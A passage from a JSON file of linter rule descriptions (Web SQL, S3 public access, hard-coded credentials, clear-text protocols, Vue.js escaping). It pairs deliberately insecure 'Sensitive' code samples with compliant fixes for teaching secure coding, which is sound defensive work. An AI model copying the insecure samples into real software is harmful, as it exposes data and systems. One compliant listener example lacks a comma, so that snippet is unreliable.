versioned: true\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html\">AWS documentation</a> - Using versioning in S3 buckets </li>\n  <li> <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html#versioned\">AWS CDK version 2</a> - Using versioning in S3\n  buckets </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S2817": {
        "name": "Web SQL databases should not be used",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<h2>Why is this an issue?</h2>\n<p>The Web SQL Database standard never saw the light of day. It was first formulated, then deprecated by the W3C and was only implemented in some\nbrowsers. (It is not supported in Firefox or IE.)</p>\n<p>Further, the use of a Web SQL Database poses security concerns, since you only need its name to access such a database.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nvar db = window.openDatabase(\"myDb\", \"1.0\", \"Personal secrets stored here\", 2*1024*1024);  // Noncompliant\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "typescript:S6281": {
        "name": "Allowing public ACLs or policies on a S3 bucket is security-sensitive",
        "htmlDesc": "<p>By default S3 buckets are private, it means that only the bucket owner can access it.</p>\n<p>This access control can be relaxed with ACLs or policies.</p>\n<p>To prevent permissive policies or ACLs to be set on a S3 bucket the following booleans settings can be enabled:</p>\n<ul>\n  <li> <code>blockPublicAcls</code>: to block or not public ACLs to be set to the S3 bucket. </li>\n  <li> <code>ignorePublicAcls</code>: to consider or not existing public ACLs set to the S3 bucket. </li>\n  <li> <code>blockPublicPolicy</code>: to block or not public policies to be set to the S3 bucket. </li>\n  <li> <code>restrictPublicBuckets</code>: to restrict or not the access to the S3 endpoints of public policies to the principals within the bucket\n  owner account. </li>\n</ul>\n<p>The other attribute <code>BlockPublicAccess.BLOCK_ACLS</code> only turns on <code>blockPublicAcls</code> and <code>ignorePublicAcls</code>. The\npublic policies can still affect the S3 bucket.</p>\n<p>However, all of those options can be enabled by setting the <code>blockPublicAccess</code> property of the S3 bucket to\n<code>BlockPublicAccess.BLOCK_ALL</code>.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive data. </li>\n  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>\n  <li> Many users have the permission to set ACL or policy to the S3 bucket. </li>\n  <li> These settings are not already enforced to true at the account level. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to configure:</p>\n<ul>\n  <li> <code>blockPublicAcls</code> to <code>True</code> to block new attempts to set public ACLs. </li>\n  <li> <code>ignorePublicAcls</code> to <code>True</code> to block existing public ACLs. </li>\n  <li> <code>blockPublicPolicy</code> to <code>True</code> to block new attempts to set public policies. </li>\n  <li> <code>restrictPublicBuckets</code> to <code>True</code> to restrict existing public policies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>By default, when not set, the <code>blockPublicAccess</code> is fully deactivated (nothing is blocked):</p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'id', {\n    bucketName: 'bucket'\n}); // Sensitive\n</pre>\n<p>This <code>block_public_access</code> allows public ACL to be set:</p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'id', {\n    bucketName: 'bucket',\n    blockPublicAccess: new s3.BlockPublicAccess({\n        blockPublicAcls         : false, // Sensitive\n        blockPublicPolicy       : true,\n        ignorePublicAcls        : true,\n        restrictPublicBuckets   : true\n    })\n});\n</pre>\n<p>The attribute <code>BLOCK_ACLS</code> only blocks and ignores public ACLs:</p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'id', {\n    bucketName: 'bucket',\n    blockPublicAccess: s3.BlockPublicAccess.BLOCK_ACLS // Sensitive\n});\n</pre>\n<h2>Compliant Solution</h2>\n<p>This <code>blockPublicAccess</code> blocks public ACLs and policies, ignores existing public ACLs and restricts existing public policies:</p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'id', {\n    bucketName: 'bucket',\n    blockPublicAccess: s3.BlockPublicAccess.BLOCK_ALL\n});\n</pre>\n<p>A similar configuration to the one above can be obtained by setting all parameters of the <code>blockPublicAccess</code></p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'id', {\n    bucketName: 'bucket',\n    blockPublicAccess: new s3.BlockPublicAccess({\n        blockPublicAcls         : true,\n        blockPublicPolicy       : true,\n        ignorePublicAcls        : true,\n        restrictPublicBuckets   : true\n    })\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html\">AWS Documentation</a> - Blocking public\n  access to your Amazon S3 storage </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.BlockPublicAccess.html\">AWS CDK version 2</a> - BlockPublicAccess </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S2068": {
        "name": "Hard-coded credentials are security-sensitive",
        "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true\nfor applications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>\n<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection\nstrings, and for variable names that match any of the patterns from the provided list.</p>\n<p>It’s recommended to customize the configuration of this rule with additional credential words such as \"oauthToken\", \"secret\", …​</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>\n  <li> Credentials are used in production environments. </li>\n  <li> Application re-distribution is required before updating the credentials. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider’s service for managing secrets. </li>\n  <li> If a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nvar mysql = require('mysql');\n\nvar connection = mysql.createConnection(\n{\n  host:'localhost',\n  user: \"admin\",\n  database: \"project\",\n  password: \"mypassword\", // sensitive\n  multipleStatements: true\n});\n\nconnection.connect();\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvar mysql = require('mysql');\n\nvar connection = mysql.createConnection({\n  host: process.env.MYSQL_URL,\n  user: process.env.MYSQL_USERNAME,\n  password: process.env.MYSQL_PASSWORD,\n  database: process.env.MYSQL_DATABASE\n});\nconnection.connect();\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "typescript:S5332": {
        "name": "Using clear-text protocols is security-sensitive",
        "htmlDesc": "<p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the\ncapability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the\ntransported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>\n<ul>\n  <li> sensitive data exposure </li>\n  <li> traffic redirected to a malicious endpoint </li>\n  <li> malware-infected software update or installer </li>\n  <li> execution of client-side code </li>\n  <li> corruption of critical information </li>\n</ul>\n<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks\ninvolving communications being sniffed or tampered with can still happen.</p>\n<p>For example, attackers could successfully compromise prior security layers by:</p>\n<ul>\n  <li> bypassing isolation mechanisms </li>\n  <li> compromising a component of the network </li>\n  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>\n</ul>\n<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network\ncomponents. By layering various security practices (segmentation and encryption, for example), the application will follow the\n<em>defense-in-depth</em> principle.</p>\n<p>Note that using the <code>http</code> protocol is being deprecated by <a\nhref=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http\">major web browsers</a>.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-6169\">CVE-2019-6169</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-12327\">CVE-2019-12327</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-11065\">CVE-2019-11065</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>\n  <li> Application data transits over an untrusted network. </li>\n  <li> Compliance rules require the service to encrypt data in transit. </li>\n  <li> Your application renders web pages with a relaxed mixed content policy. </li>\n  <li> OS-level protections against clear-text traffic are deactivated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most\n  common clear-text protocols:\n    <ul>\n      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>\n      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>\n      <li> Use <code>https</code> instead of <code>http</code>. </li>\n      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>\n    </ul>  </li>\n  <li> Enable encryption of cloud components communications whenever it is possible. </li>\n  <li> Configure your application to block mixed content when rendering web pages. </li>\n  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>\n</ul>\n<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire\napplication or system.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nurl = \"http://example.com\"; // Sensitive\nurl = \"ftp://anonymous@example.com\"; // Sensitive\nurl = \"telnet://anonymous@example.com\"; // Sensitive\n</pre>\n<p>For <a href=\"https://nodemailer.com\">nodemailer</a>:</p>\n<pre>\nconst nodemailer = require(\"nodemailer\");\nlet transporter = nodemailer.createTransport({\n  secure: false, // Sensitive\n  requireTLS: false // Sensitive\n});\n</pre>\n<pre>\nconst nodemailer = require(\"nodemailer\");\nlet transporter = nodemailer.createTransport({}); // Sensitive\n</pre>\n<p>For <a href=\"https://github.com/mscdex/node-ftp\">ftp</a>:</p>\n<pre>\nvar Client = require('ftp');\nvar c = new Client();\nc.connect({\n  'secure': false // Sensitive\n});\n</pre>\n<p>For <a href=\"https://github.com/mkozjak/node-telnet-client\">telnet-client</a>:</p>\n<pre>\nconst Telnet = require('telnet-client'); // Sensitive\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationLoadBalancer.html\">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationLoadBalancer</a>:</p>\n<pre>\nimport { ApplicationLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nconst alb = new ApplicationLoadBalancer(this, 'ALB', {\n  vpc: vpc,\n  internetFacing: true\n});\n\nalb.addListener('listener-http-default', {\n  port: 8080,\n  open: true\n}); // Sensitive\n\nalb.addListener('listener-http-explicit', {\n  protocol: ApplicationProtocol.HTTP, // Sensitive\n  port: 8080,\n  open: true\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationListener.html\">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationListener</a>:</p>\n<pre>\nimport { ApplicationListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nnew ApplicationListener(this, 'listener-http-explicit-constructor', {\n  loadBalancer: alb,\n  protocol: ApplicationProtocol.HTTP, // Sensitive\n  port: 8080,\n  open: true\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkLoadBalancer.html\">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkLoadBalancer</a>:</p>\n<pre>\nimport { NetworkLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nconst nlb = new NetworkLoadBalancer(this, 'nlb', {\n  vpc: vpc,\n  internetFacing: true\n});\n\nvar listenerNLB = nlb.addListener('listener-tcp-default', {\n  port: 1234\n}); // Sensitive\n\nlistenerNLB = nlb.addListener('listener-tcp-explicit', {\n  protocol: Protocol.TCP, // Sensitive\n  port: 1234\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkListener.html\">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkListener</a>:</p>\n<pre>\nimport { NetworkListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nnew NetworkListener(this, 'listener-tcp-explicit-constructor', {\n  loadBalancer: nlb,\n  protocol: Protocol.TCP, // Sensitive\n  port: 8080\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.CfnListener.html\">aws-cdk-lib.aws-elasticloadbalancingv2.CfnListener</a>:</p>\n<pre>\nimport { CfnListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nnew CfnListener(this, 'listener-http', {\n  defaultActions: defaultActions,\n  loadBalancerArn: alb.loadBalancerArn,\n  protocol: \"HTTP\", // Sensitive\n  port: 80\n});\n\nnew CfnListener(this, 'listener-tcp', {\n  defaultActions: defaultActions,\n  loadBalancerArn: alb.loadBalancerArn,\n  protocol: \"TCP\", // Sensitive\n  port: 80\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.CfnLoadBalancer.html\">aws-cdk-lib.aws-elasticloadbalancing.CfnLoadBalancer</a>:</p>\n<pre>\nimport { CfnLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancing';\n\nnew CfnLoadBalancer(this, 'elb-tcp', {\n  listeners: [{\n    instancePort: '1000',\n    loadBalancerPort: '1000',\n    protocol: 'tcp' // Sensitive\n  }]\n});\n\nnew CfnLoadBalancer(this, 'elb-http', {\n  listeners: [{\n    instancePort: '1000',\n    loadBalancerPort: '1000',\n    protocol: 'http' // Sensitive\n  }]\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.LoadBalancer.html\">aws-cdk-lib.aws-elasticloadbalancing.LoadBalancer</a>:</p>\n<pre>\nimport { LoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancing';\n\nconst loadBalancer = new LoadBalancer(this, 'elb-tcp-dict', {\n    vpc,\n    internetFacing: true,\n    healthCheck: {\n    port: 80,\n    },\n    listeners: [\n    {\n        externalPort:10000,\n        externalProtocol: LoadBalancingProtocol.TCP, // Sensitive\n        internalPort:10000\n    }]\n});\n\nloadBalancer.addListener({\n  externalPort:10001,\n  externalProtocol:LoadBalancingProtocol.TCP, // Sensitive\n  internalPort:10001\n});\nloadBalancer.addListener({\n  externalPort:10002,\n  externalProtocol:LoadBalancingProtocol.HTTP, // Sensitive\n  internalPort:10002\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticache.CfnReplicationGroup.html\">aws-cdk-lib.aws-elasticache.CfnReplicationGroup</a>:</p>\n<pre>\nimport { CfnReplicationGroup } from 'aws-cdk-lib/aws-elasticache';\n\nnew CfnReplicationGroup(this, 'unencrypted-implicit', {\n  replicationGroupDescription: 'exampleDescription'\n}); // Sensitive\n\nnew CfnReplicationGroup(this, 'unencrypted-explicit', {\n  replicationGroupDescription: 'exampleDescription',\n  transitEncryptionEnabled: false // Sensitive\n});\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.CfnStream.html\">aws-cdk-lib.aws-kinesis.CfnStream</a>:</p>\n<pre>\nimport { CfnStream } from 'aws-cdk-lib/aws-kinesis';\n\nnew CfnStream(this, 'cfnstream-implicit-unencrytped', undefined); // Sensitive\n\nnew CfnStream(this, 'cfnstream-explicit-unencrytped', {\n  streamEncryption: undefined // Sensitive\n});\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.Stream.html\">aws-cdk-lib.aws-kinesis.Stream</a>:</p>\n<pre>\nimport { Stream } from 'aws-cdk-lib/aws-kinesis';\n\nnew Stream(this, 'stream-explicit-unencrypted', {\n  encryption: StreamEncryption.UNENCRYPTED // Sensitive\n});\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nurl = \"https://example.com\";\nurl = \"sftp://anonymous@example.com\";\nurl = \"ssh://anonymous@example.com\";\n</pre>\n<p>For <a href=\"https://nodemailer.com\">nodemailer</a> one of the following options must be set:</p>\n<pre>\nconst nodemailer = require(\"nodemailer\");\nlet transporter = nodemailer.createTransport({\n  secure: true,\n  requireTLS: true,\n  port: 465,\n  secured: true\n});\n</pre>\n<p>For <a href=\"https://github.com/mscdex/node-ftp\">ftp</a>:</p>\n<pre>\nvar Client = require('ftp');\nvar c = new Client();\nc.connect({\n  'secure': true\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationLoadBalancer.html\">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationLoadBalancer</a>:</p>\n<pre>\nimport { ApplicationLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nconst alb = new ApplicationLoadBalancer(this, 'ALB', {\n  vpc: vpc,\n  internetFacing: true\n});\n\nalb.addListener('listener-https-explicit', {\n  protocol: ApplicationProtocol.HTTPS,\n  port: 8080,\n  open: true,\n  certificates: [certificate]\n});\n\nalb.addListener('listener-https-implicit', {\n  port: 8080,\n  open: true,\n  certificates: [certificate]\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationListener.html\">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationListener</a>:</p>\n<pre>\nimport { ApplicationListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nnew ApplicationListener(this, 'listener-https-explicit', {\n  loadBalancer: loadBalancer,\n  protocol: ApplicationProtocol.HTTPS,\n  port: 8080,\n  open: true,\n  certificates: [certificate]\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkLoadBalancer.html\">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkLoadBalancer</a>:</p>\n<pre>\nimport { NetworkLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nconst nlb = new NetworkLoadBalancer(this, 'nlb', {\n  vpc: vpc,\n  internetFacing: true\n});\n\nnlb.addListener('listener-tls-explicit', {\n  protocol: Protocol.TLS,\n  port: 1234,\n  certificates: [certificate]\n});\n\nnlb.addListener('listener-tls-implicit', {\n  port: 1234,\n  certificates: [certificate]\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkListener.html\">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkListener</a>:</p>\n<pre>\nimport { NetworkListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nnew NetworkListener(this, 'listener-tls-explicit', {\n  loadBalancer: loadBalancer,\n  protocol: Protocol.TLS,\n  port: 8080,\n  certificates: [certificate]\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.CfnListener.html\">aws-cdk-lib.aws-elasticloadbalancingv2.CfnListener</a>:</p>\n<pre>\nimport { CfnListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nnew CfnListener(this, 'listener-https', {\n  defaultActions: defaultActions,\n  loadBalancerArn: loadBalancerArn,\n  protocol: \"HTTPS\",\n  port: 80\n  certificates: [certificate]\n});\n\nnew CfnListener(this, 'listener-tls', {\n  defaultActions: defaultActions,\n  loadBalancerArn: loadBalancerArn,\n  protocol: \"TLS\",\n  port: 80\n  certificates: [certificate]\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.CfnLoadBalancer.html\">aws-cdk-lib.aws-elasticloadbalancing.CfnLoadBalancer</a>:</p>\n<pre>\nimport { CfnLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancing';\n\nnew CfnLoadBalancer(this, 'elb-ssl', {\n  listeners: [{\n    instancePort: '1000',\n    loadBalancerPort: '1000',\n    protocol: 'ssl',\n    sslCertificateId: sslCertificateId\n  }]\n});\n\nnew CfnLoadBalancer(this, 'elb-https', {\n  listeners: [{\n    instancePort: '1000',\n    loadBalancerPort: '1000',\n    protocol: 'https',\n    sslCertificateId: sslCertificateId\n  }]\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.LoadBalancer.html\">aws-cdk-lib.aws-elasticloadbalancing.LoadBalancer</a>:</p>\n<pre>\nimport { LoadBalancer, LoadBalancingProtocol } from 'aws-cdk-lib/aws-elasticloadbalancing';\n\nconst lb = new LoadBalancer(this, 'elb-ssl', {\n  vpc,\n  internetFacing: true,\n  healthCheck: {\n    port: 80,\n  },\n  listeners: [\n    {\n      externalPort:10000,\n      externalProtocol:LoadBalancingProtocol.SSL,\n      internalPort:10000\n    }]\n});\n\nlb.addListener({\n  externalPort:10001,\n  externalProtocol:LoadBalancingProtocol.SSL,\n  internalPort:10001\n});\nlb.addListener({\n  externalPort:10002,\n  externalProtocol:LoadBalancingProtocol.HTTPS,\n  internalPort:10002\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticache.CfnReplicationGroup.html\">aws-cdk-lib.aws-elasticache.CfnReplicationGroup</a>:</p>\n<pre>\nimport { CfnReplicationGroup } from 'aws-cdk-lib/aws-elasticache';\n\nnew CfnReplicationGroup(this, 'encrypted-explicit', {\n  replicationGroupDescription: 'example',\n  transitEncryptionEnabled: true\n});\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.Stream.html\">aws-cdk-lib.aws-kinesis.Stream</a>:</p>\n<pre>\nimport { Stream } from 'aws-cdk-lib/aws-kinesis';\n\nnew Stream(this, 'stream-implicit-encrypted');\n\nnew Stream(this, 'stream-explicit-encrypted-selfmanaged', {\n  encryption: StreamEncryption.KMS,\n  encryptionKey: encryptionKey,\n});\n\nnew Stream(this, 'stream-explicit-encrypted-managed', {\n  encryption: StreamEncryption.MANAGED\n});\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.CfnStream.html\">aws-cdk-lib.aws-kinesis.CfnStream</a>:</p>\n<pre>\nimport { CfnStream } from 'aws-cdk-lib/aws-kinesis';\n\nnew CfnStream(this, 'cfnstream-explicit-encrypted', {\n  streamEncryption: {\n    encryptionType: encryptionType,\n    keyId: encryptionKey.keyId,\n  }\n});\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data Exposure\n  </a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/319\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n  <li> <a href=\"https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html\">Google, Moving towards more secure web</a> </li>\n  <li> <a href=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/\">Mozilla, Deprecating non secure http</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html\">AWS Documentation</a> - Listeners\n  for your Application Load Balancers </li>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html\">AWS\n  Documentation</a> - Stream Encryption </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S6299": {
        "name": "Disabling Vue.js built-in escaping is security-sensitive",
        "htmlDesc": "<p>Vue.js framework prevents XSS vulnerabilities by automatically escaping HTML contents with the use of native API browsers like\n<code>innerText</code> instead of <code>innerHtml</code>.</p>\n<p>It’s still possible to explicity use <code>innerHtml</code> and similar APIs to render HTML. Accidentally rendering malicious HTML data will\nintroduce an XSS vulnerability in the application and enable a wide range of serious attacks like accessing/modifying sensitive information or\nimpersonating other users.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The application needs to render HTML content which:</p>\n<ul>\n  <li> could be user-controlled and not previously sanitized. </li>\n  <li> is difficult to understand how it was constructed. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Avoid injecting HTML content with <code>v-html</code> directive unless the content can be considered 100% safe, instead try to rely as much as\n  possible on built-in auto-escaping Vue.js features. </li>\n  <li> Take care when using the <code>v-bind:href</code> directive to set URLs which can contain malicious Javascript\n  (<code>javascript:onClick(...)</code>). </li>\n  <li> Event directives like <code>:onmouseover</code> are also prone to Javascript injection and should not be used with unsafe values. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>When using Vue.js templates, the <code>v-html</code> directive enables HTML rendering without any sanitization:</p>\n<pre>\n&lt;div v-html=\"htmlContent\"&gt;&lt;/div&gt; &lt;!-- Noncompliant --&gt;\n</pre>\n<p>When using a rendering function, the <code>innerHTML</code> attribute enables HTML rendering without any sanitization:</p>\n<pre>\nVue.component('element', {\n  render: function (createElement) {\n    return createElement(\n      'div',\n      {\n        domProps: {\n          innerHTML: this.htmlContent, // Noncompliant\n        }\n      }\n    );\n  },\n});\n</pre>\n<p>When using JSX, the <code>domPropsInnerHTML</code> attribute enables HTML rendering without any sanitization:</p>\n<pre>\n&lt;div domPropsInnerHTML={this.htmlContent}&gt;&lt;/div&gt; &lt;!-- Noncompliant --&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<p>When using Vue.js templates, putting the content as a child node of the element is safe:</p>\n<pre>\n&lt;div&gt;{{ htmlContent }}&lt;/div&gt;\n</pre>\n<p>When using a rendering function, using the <code>innerText</code> attribute or putting the content as a child node of the element is safe:</p>\n<pre>\nVue.component('element', {\n  render: function (createElement) {\n    return createElement(\n      'div',\n      {\n        domProps: {\n          innerText: this.htmlContent,\n        }\n      },\n      this.htmlContent // Child node\n    );\n  